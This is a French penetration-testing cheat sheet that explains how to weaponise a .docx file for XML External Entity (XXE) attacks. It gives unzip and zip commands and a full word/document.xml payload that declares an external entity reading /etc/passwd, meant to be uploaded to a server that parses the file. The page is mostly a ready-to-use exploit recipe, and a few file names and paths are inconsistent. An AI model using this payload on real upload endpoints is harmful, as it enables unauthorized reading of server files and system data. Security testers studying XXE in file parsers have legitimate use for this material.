# Office Open XML Document

<img src="logo.png" title="" alt="" height="150">

**Facteur de risque** : XXE

**Extension** : `.docx`, `docm`

**Type MIME** : `application/vnd.openxmlformats-officedocument.wordprocessingml.document`

**Description** : 

**Office Open XML** (OOXML) est un format de fichier **zippé** et basé sur le **XML**, pour représenter des feuilles de calcul, des graphiques, des présentations et des documents de traitement de texte. 

`.docx` est une extension de nom de fichier pour traitement de texte au format Office Open XML. `.docm` permet en plus l'utilisation des **macros**.

Un fichier `.docx` peut être désarchiver comme un fichier `.zip`. Il contient notamment plusieurs fichiers `.xml`. Microsoft conseille d'analyser dans l'ordre :

- le fichier `_rels/.rels`, qui contient les relations en reliant un ID à chaque fichier

- le fichier `[Content_Types].xml` qui contient une liste de type MIME

- le fichier `word/document.xml`, qui donne une vue d'ensemble du contenu du classeur (nom des feuilles, etc.). La plupart du temps, les applications web analysent ce fichier en premier.

Un fichier Excel ou un fichier Google Sheets en `.xlsx` correspond donc en réalité à un fichier archive `.zip` contenant plusieurs fichiers `.xml`. Des payloads pour XXE peuvent être donc injectés dans les fichiers.

## Sommaire

- XML External Entity (XML)

## XML External Entity (XML)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé
- Le serveur web doit analyser et traiter les données du fichier.

### Exploitation

Créez un nouveau fichier Word ou Google Docss vide, puis enregistrez le fichier au format `.docx` (**xxe.xlsx**)

1. Déarchivez le fichier `.docx` dans un répertoire (**FichierMalveillant**) :
   
   ```shell
   unzip xxe.docx -d FichierMalveillant
   ```

2. Le payload XXE doit être ajouté dans le fichier `.xml` que l'application traitera (dans les fichiers `word/document.xml` :
   
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 w15 w16se wp14"><w:body><w:p w:rsidR="000310EC" w:rsidRDefault="00981224" w:rsidP="00981224"><w:pPr><w:pStyle w:val="Titre"/></w:pPr><w:r><w:t>Titre</w:t></w:r></w:p><w:p w:rsidR="00981224" w:rsidRDefault="00981224"><w:r><w:t>&xxe;</w:t></w:r><w:bookmarkStart w:id="0" w:name="_GoBack"/><w:bookmarkEnd w:id="0"/></w:p><w:sectPr w:rsidR="00981224"><w:pgSz w:w="11906" w:h="16838"/><w:pgMar w:top="1417" w:right="1417" w:bottom="1417" w:left="1417" w:header="708" w:footer="708" w:gutter="0"/><w:cols w:space="708"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>
   ```
   
   Ici, le payload a été placé dans le fichier pour récupérer le contenu de `/etc/password`.

3. Archivez à nouveau le fichier `.docx`, puis téléversez-le. (Il faut savoir que le fichier est techniquement correct d'après les spécifications, mais Office n'ouvrira pas le fichier). 
   
   ```shell
   zip -r xxe.docx FichierMalveillant/*
   ```
   
   ou
   
   ```shell
   zip -u xxe.docx word/document.xml
   ```

## References

- Exploiting XXE Vulnerabilities In File Parsing Functionality - YouTube : https://www.youtube.com/watch?v=LZUlw8hHp44
- Black Hat | WebCast: Exploiting XML Entity Vulnerabilities in File Parsing Functionality : https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html
- GitHub - BuffaloWill/oxml_xxe: A tool for embedding XXE/XML exploits into different filetypes : https://github.com/BuffaloWill/oxml_xxe

## Todo

- Ajouter un payload dans le fichier `[Content_Types].xml`

- Ajouter pour les formats SVG, Libre Office ou Open Office (`word/document.xml` -> `content.xml`), et SVG à l'internieur de LIbre ou Open
